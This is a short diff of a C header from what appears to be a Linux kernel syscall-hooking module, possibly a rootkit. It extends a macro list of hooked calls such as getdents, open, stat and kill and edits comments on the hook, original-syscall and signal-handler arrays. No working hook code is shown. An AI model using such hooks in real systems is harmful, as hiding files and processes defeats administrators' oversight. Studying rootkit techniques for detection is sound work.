@@ -6,12 +6,13 @@
 #include "utils.h"
 #include <asm/unistd.h>
 
-#define HOOKED_SYSCALLS \
-    read, pread64, write, sendfile, open, stat, lstat, getdents, getdents64, kill
+#define HOOKED_SYSCALLS                                                                         \
+    read, pread64, write, sendfile, open, openat, openat2, access, faccessat, faccessat2, stat, \
+        lstat, newfstatat, /*statx,*/ getdents, getdents64, kill
 
-#define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name of the syscall hook array */
-#define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name of the original syscall functions array */
-#define P_SIG_HANDLERS  p_sig_handlers  /* Variable name of the signal handler array */
+#define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
+#define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
+#define P_SIG_HANDLERS  p_sig_handlers  /* Variable name for the signal handler array */
 
 // Array of the original syscall function references.
 extern sysfun_t P_ORIG_SYSFUNS[__NR_syscalls];
